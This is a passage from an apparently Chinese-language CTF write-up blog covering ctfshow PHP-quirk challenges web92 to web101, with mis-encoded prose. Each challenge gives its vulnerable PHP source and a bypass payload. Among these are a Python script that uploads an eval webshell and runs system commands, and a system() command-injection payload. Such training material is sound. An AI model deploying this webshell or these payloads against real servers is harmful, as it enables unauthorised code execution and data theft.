class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>È¢ùÔºåÂíå90È¢ò‰∏ÄÊ†∑ÔºåÂè™ÊòØÂèòÊàêÂº±ÊØîËæÉÔºå‰∏ÄÊ†∑‰ΩøÁî®ÂçÅÂÖ≠ËøõÂà∂ÁªïËøá</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;0x117c</span><br></pre></td></tr></table></figure><h3 id="web93"><a class="header-anchor" href="#web93">¬∂</a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøáÊª§‰∫ÜÂ≠óÊØçÔºåÈÇ£Êàë‰ª¨Áõ¥Êé•Áî®Â∞èÊï∞ÁÇπÂç≥ÂèØ(Âà©Áî®phpÊµÆÁÇπÊï∞‰∏çËÉΩÁõ¥Êé•ÊØîËæÉÁõ∏Á≠âÁöÑÁâπÊÄß)ÔºåÊàñËÄÖ8ËøõÂà∂‰πüË°å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;4476.1</span><br></pre></td></tr></table></figure><h3 id="web94"><a class="header-anchor" href="#web94">¬∂</a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÂèòÊàêÂº∫ÊØîËæÉÔºåÂπ∂‰∏îÂ§öÂä†‰∫Ü‰∏Ä‰∏™strposÂáΩÊï∞</p><blockquote><p><strong>strpos()</strong> ÂáΩÊï∞Êü•ÊâæÂ≠óÁ¨¶‰∏≤Âú®Âè¶‰∏ÄÂ≠óÁ¨¶‰∏≤‰∏≠Á¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(string,find,start)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">ÂèÇÊï∞</th><th style="text-align:left">ÊèèËø∞</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">ÂøÖÈúÄ„ÄÇËßÑÂÆöË¶ÅÊêúÁ¥¢ÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ</td></tr><tr><td style="text-align:left"><em>find</em></td><td style="text-align:left">ÂøÖÈúÄ„ÄÇËßÑÂÆöË¶ÅÊü•ÊâæÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ</td></tr><tr><td style="text-align:left"><em>start</em></td><td style="text-align:left">ÂèØÈÄâ„ÄÇËßÑÂÆöÂú®‰ΩïÂ§ÑÂºÄÂßãÊêúÁ¥¢„ÄÇ</td></tr></tbody></table><p>ËøîÂõûÂ≠óÁ¨¶‰∏≤Âú®Âè¶‰∏ÄÂ≠óÁ¨¶‰∏≤‰∏≠Á¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÔºåÂ¶ÇÊûúÊ≤°ÊúâÊâæÂà∞Â≠óÁ¨¶‰∏≤ÂàôËøîÂõû FALSE„ÄÇ</p><p><strong>Ê≥®Èáä</strong>ÔºöÂ≠óÁ¨¶‰∏≤‰ΩçÁΩÆ‰ªé 0 ÂºÄÂßãÔºå‰∏çÊòØ‰ªé 1 ÂºÄÂßã„ÄÇ</p></blockquote><p>Âõ†‰∏∫ÂÖ´ËøõÂà∂ÈúÄË¶ÅÂºÄÂ§¥ÊåáÂÆö‰∏∫0ÔºåËÄåstrpos()‰ºöÂåπÈÖçÂà∞ËøîÂõû0Ôºå!0‰πüÂ∞±ÊòØ1ÂæóÊâßË°ådieÔºåÊàë‰ª¨ÂèØ‰ª•Âú®ÂâçÈù¢Âä†‰∏™Á©∫Ê†ºÔºåËøôÊ†∑strpos()‰ºöËøîÂõû1ÔºåÊâÄ‰ª•Êàë‰ª¨Êää4476ËΩ¨Êç¢‰∏∫8ËøõÂà∂10574ÂêéÔºåÂâçÈù¢ÂÜçÂä†‰∏Ä‰∏™Á©∫Ê†ºÂç≥ÂèØÔºåpaylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D; 010574</span><br></pre></td></tr></table></figure><h3 id="web95"><a class="header-anchor" href="#web95">¬∂</a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, $num))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos($num, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Êç¢ÊàêÂº±ÊØîËæÉ‰∫ÜÔºå‰∏ÄÊ†∑‰ΩøÁî®‰∏äÈ¢òpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D; 010574</span><br></pre></td></tr></table></figure><h3 id="web96"><a class="header-anchor" href="#web96">¬∂</a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file($_GET[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËØªÂèñÊñá‰ª∂ÔºåÂèÇÊï∞‰∏çÁ≠â‰∫éflag.phpÔºåÈÇ£Áõ¥Êé•Âä†‰∏™<code>./</code>Âç≥ÂèØÔºåÊúâÂ§öÁßçÂäûÊ≥ïÔºåphp‰º™ÂçèËÆÆ‰πüÂèØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u&#x3D;.&#x2F;flag.php</span><br></pre></td></tr></table></figure><h3 id="web97"><a class="header-anchor" href="#web97">¬∂</a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">		<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âº∫ÊØîËæÉmd5Á±ªÂûãÈ¢òÁõÆÔºåÊàëÂàöÂ•ΩÂÅöËøáËøô‰∏™È¢òÂûãÊÄªÁªìÔºåÂ∏àÂÇÖ‰ª¨ÂèØ‰ª•ÂéªÊàëÁöÑËøôÁØáÊñáÁ´†ÁúãÁúãhttps://www.wlhhlc.top/posts/16813/<br>md5ÂáΩÊï∞Â§ÑÁêÜÊï∞ÁªÑËàíÊúç‰ºöËøîÂõûNULLÔºå‰∏§‰∏™NULLÂç≥Áõ∏Á≠â<br>paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postÔºö</span><br><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="web98"><a class="header-anchor" href="#web98">¬∂</a>web98</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_COOKIE:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">$_GET[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$_GET=&amp;$_SERVER:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file($_GET[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?$flag:<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>ËøôÈáåÊòØ‰∏âÁõÆËøêÁÆóÁ¨¶ÂíåÂèñÂú∞ÂùÄÔºåÁ¨¨‰∫åË°åÂíåÁ¨¨‰∏âË°åÊòØÊó†Áî®ÁöÑÔºåÂõ†‰∏∫Áî®‰∏çÂà∞ÔºåÊâÄ‰ª•Êàë‰ª¨ÂàÜÊûê‰∏Ä‰∏ãÁ¨¨‰∏ÄË°åÂíåÁ¨¨ÂõõË°å</p><blockquote><p>Á¨¨‰∏ÄË°åÔºöÂ¶ÇÊûúÂ≠òÂú®get‰º†ÂèÇÔºåÂàôÊääpost‰º†ÂèÇÂú∞ÂùÄÁªôgetÔºåÂèØ‰ª•ÁÆÄÂçïÁêÜËß£‰∏∫postË¶ÜÁõñ‰∫Üget<br>Á¨¨ÂõõË°åÔºåÂ¶ÇÊûúgetÂèÇÊï∞<code>HTTP_FLAG</code>ÁöÑÂÄº‰∏∫flagÔºåÂ∞±ËØªÂèñÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØËæìÂá∫flag</p></blockquote><p>ÊâÄ‰ª•ÊÄùË∑Ø‰πüÂ∞±Âá∫Êù•‰∫ÜÔºåpayload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;2</span><br><span class="line"></span><br><span class="line">postÔºö</span><br><span class="line">HTTP_FLAG&#x3D;flag</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web98/V0DP3K7N%5BS%7BO%29LE%5B%40U%5DGTVY.png" alt=""></p><h3 id="web99"><a class="header-anchor" href="#web99">¬∂</a>web99</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$allow = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">36</span>; $i &lt; <span class="number">0x36d</span>; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(<span class="number">1</span>,$i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array($_GET[<span class="string">&#x27;n&#x27;</span>], $allow))&#123;</span><br><span class="line">    file_put_contents($_GET[<span class="string">&#x27;n&#x27;</span>], $_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>Áúã‰∏Ä‰∏ã‰ª£Á†ÅÔºåÊµÅÁ®ã‰∏ªË¶ÅÊòØÂÖàÂàõÂª∫‰∏Ä‰∏™Êï∞ÁªÑÔºåÊé•ÁùÄÂæÄÊï∞ÁªÑÈáåÊ∑ªÂä†rand()ÂáΩÊï∞‰∫ßÁîüÁöÑÈöèÊú∫Êï∞Ôºõ<br>Á¨¨‰∫å‰∏™ifÂà§Êñ≠ÊòØÂê¶Â≠òÂú®getÂèÇÊï∞nÔºåÂπ∂‰∏îÁî®in_array()Âú®Êï∞ÁªÑÈáåÊêúÁ¥¢ÂÄº<br>ÊúÄÂêéÁî®file_put_contentsÂáΩÊï∞ÂÜôÊï∞ÊçÆÂà∞Êñá‰ª∂‰∏≠</p><blockquote><p>in_array() ÂáΩÊï∞ÊêúÁ¥¢Êï∞ÁªÑ‰∏≠ÊòØÂê¶Â≠òÂú®ÊåáÂÆöÁöÑÂÄº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,<span class="keyword">array</span>,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">ÂèÇÊï∞</th><th style="text-align:left">ÊèèËø∞</th></tr></thead><tbody><tr><td style="text-align:left"><em>search</em></td><td style="text-align:left">ÂøÖÈúÄ„ÄÇËßÑÂÆöË¶ÅÂú®Êï∞ÁªÑÊêúÁ¥¢ÁöÑÂÄº„ÄÇ</td></tr><tr><td style="text-align:left"><em>array</em></td><td style="text-align:left">ÂøÖÈúÄ„ÄÇËßÑÂÆöË¶ÅÊêúÁ¥¢ÁöÑÊï∞ÁªÑ„ÄÇ</td></tr><tr><td style="text-align:left"><em>type</em></td><td style="text-align:left">ÂèØÈÄâ„ÄÇÂ¶ÇÊûúËÆæÁΩÆËØ•ÂèÇÊï∞‰∏∫ trueÔºåÂàôÊ£ÄÊü•ÊêúÁ¥¢ÁöÑÊï∞ÊçÆ‰∏éÊï∞ÁªÑÁöÑÂÄºÁöÑÁ±ªÂûãÊòØÂê¶Áõ∏Âêå„ÄÇ</td></tr></tbody></table><p><strong>ËØ¥Êòé</strong></p><p>Â¶ÇÊûúÁªôÂÆöÁöÑÂÄº <em>search</em> Â≠òÂú®‰∫éÊï∞ÁªÑ <em>array</em> ‰∏≠ÂàôËøîÂõû true„ÄÇÂ¶ÇÊûúÁ¨¨‰∏â‰∏™ÂèÇÊï∞ËÆæÁΩÆ‰∏∫ trueÔºåÂáΩÊï∞Âè™ÊúâÂú®ÂÖÉÁ¥†Â≠òÂú®‰∫éÊï∞ÁªÑ‰∏≠‰∏îÊï∞ÊçÆÁ±ªÂûã‰∏éÁªôÂÆöÂÄºÁõ∏ÂêåÊó∂ÊâçËøîÂõû true„ÄÇ</p><p>Â¶ÇÊûúÊ≤°ÊúâÂú®Êï∞ÁªÑ‰∏≠ÊâæÂà∞ÂèÇÊï∞ÔºåÂáΩÊï∞ËøîÂõû false„ÄÇ</p><p>Ê≥®ÈáäÔºöÂ¶ÇÊûú <em>search</em> ÂèÇÊï∞ÊòØÂ≠óÁ¨¶‰∏≤Ôºå‰∏î <em>type</em> ÂèÇÊï∞ËÆæÁΩÆ‰∏∫ trueÔºåÂàôÊêúÁ¥¢Âå∫ÂàÜÂ§ßÂ∞èÂÜô„ÄÇ</p></blockquote><p>ËøôÈáåin_array()ÂáΩÊï∞Âú®Ê≤°ÊúâÁ¨¨‰∏â‰∏™ÂÄºÂæóÊó∂ÂÄô‰ºöËøõË°åÂº±ÊØîËæÉÔºå‰πüÂ∞±ÊòØÂ≠òÂú®Âº∫Âà∂ËΩ¨Êç¢ÔºåÂç≥123.phpÊ≠§Êó∂‰ºöË¢´ËΩ¨Êç¢‰∏∫123ÔºåÊâÄ‰ª•payloadÂ¶Ç‰∏ã<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/KBDG%5DWII%28FDE%29DEI4%5D%25S%25DP.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/%28CW%29ZM3V7J0KRO199%5BX78%25M.png" alt=""><br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web99/H40KA9%25M2BPO3VLFDZ083_C.png" alt=""><br>ÊàëÂñúÊ¨¢Áî®ËÑöÊú¨Ë∑ë</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/23 18:43</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://5922e022-e938-4ec4-905f-0ccd7cf07cdf.chall.ctf.show:8080/&quot;</span></span><br><span class="line">w_url = url + <span class="string">&quot;?n=123.php&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell = requests.post(url=w_url, data=data1)</span><br><span class="line">shell_url = url + <span class="string">&quot;123.php&quot;</span></span><br><span class="line">get_test = requests.get(url=shell_url)</span><br><span class="line"><span class="keyword">if</span>(get_test.status_code==<span class="number">200</span>):</span><br><span class="line">    print(<span class="string">&quot;ÂÜôÂÖ•shellÊàêÂäü&quot;</span>)</span><br><span class="line">    data2=&#123;</span><br><span class="line">        <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag36d.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=shell_url, data=data2)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure><p>ËøêË°åÂêéÂç≥ÂèØÂæóÂà∞flag</p><h3 id="web100"><a class="header-anchor" href="#web100">¬∂</a>web100</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">$v2=$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">$v3=$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">$v0=is_numeric($v1) <span class="keyword">and</span> is_numeric($v2) <span class="keyword">and</span> is_numeric($v3);</span><br><span class="line"><span class="keyword">if</span>($v0)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, $v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, $v3))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>‰∏ÄÂÖ±ÈúÄË¶Å‰º†‰∏â‰∏™getÂèÇÊï∞ÔºåÁÑ∂Âêé<code>$vo</code>ÊòØÂØπ‰∏â‰∏™ÂèÇÊï∞ÁöÑ‰∏éÁöÑÁªìÊûúÔºå‰∫ÜËß£‰∏Ä‰∏ã<code>s_numeric()</code>ÂáΩÊï∞</p><blockquote><p><strong>is_numeric()</strong> ÂáΩÊï∞Áî®‰∫éÊ£ÄÊµãÂèòÈáèÊòØÂê¶‰∏∫Êï∞Â≠óÊàñÊï∞Â≠óÂ≠óÁ¨¶‰∏≤<br>Â¶ÇÊûúÊåáÂÆöÁöÑÂèòÈáèÊòØÊï∞Â≠óÂíåÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÂàôËøîÂõû TRUEÔºåÂê¶ÂàôËøîÂõû FALSE</p></blockquote><p>ÁúãÂà∞ÊúÄÂêéevalÔºåËÇØÂÆöÊòØÈúÄË¶ÅÂëΩ‰ª§ÊâßË°åÔºåËøôÈúÄË¶Å<code>$v2</code>‰º†ÂÖ•ÂëΩ‰ª§Ôºå<code>$v3</code>ÈúÄË¶Å<code>;</code>ÁªìÂ∞æÔºå‰ΩÜËøô‰πà‰∏ÄÊù•Â∞±ÂèòÊàê‰∫Ü</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$vo &#x3D; $v1 and FALSE and FAlse</span><br></pre></td></tr></table></figure><p>‰ΩÜphpÊúâËøêÁÆóÁöÑ‰ºòÂÖàÁ∫ßÔºå‰πüÂ∞±ÊòØ<code>&amp;&amp;&gt; = &gt; and</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>ÊåâÁÖßËøêÁÆó‰ºòÂÖàÁ∫ßÔºåÂÖàÊâßË°å<code>=</code>‰πüÂ∞±ÊòØËµãÂÄºÁªô$a‰∏∫trueÔºåfalseÂ∞±Ë¢´ÂøΩÁï•‰∫ÜÔºåÊÄùË∑Ø‰πüÂ∞±Êúâ‰∫ÜÔºåpaylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;system(&quot;tac ctfshow.php&quot;)&amp;v3&#x3D;;</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web100/OU85D5HVD%25ONT_%25R1M9IS_F.png" alt=""><br>ÂæóÂà∞<code>$flag_is_1ce376300x2d8dc70x2d4b870x2d9f0e0x2d1eea5dada15;</code>ÔºåÂÖ∂‰∏≠0x2dÈúÄË¶ÅÊõøÊç¢Êàê<code>-</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1ce37630-8dc7-4b87-9f0e-1eea5dada15</span><br></pre></td></tr></table></figure><p>ÁÑ∂ËÄå‰∏ÄÂÖ±35‰ΩçËøòÂ∞ë‰∫Ü‰∏Ä‰ΩçÔºåÊúÄÂêé‰∏Ä‰ΩçÈúÄË¶Å‰∏çÊñ≠Êèê‰∫§flagÁàÜÁ†¥Ôºå0-9a-f‰∏ÄÂÖ±ËØïÊúÄÂ§ö16Ê¨°Âç≥ÂèØÂæóÂà∞flagÔºåÊàëËØïÂà∞Á¨¨ÂÖ≠Ê¨°Êèê‰∫§ÊàêÂäüüò≠</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;1ce37630-8dc7-4b87-9f0e-1eea5dada156&#125;</span><br></pre></td></tr></table></figure><h3 id="web101"><a class="header-anchor" href="#web101">¬∂</a>web101</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line">$ctfshow = <span class="keyword">new</span> ctfshow();</span><br><span class="line">$v1=$_GET[<span 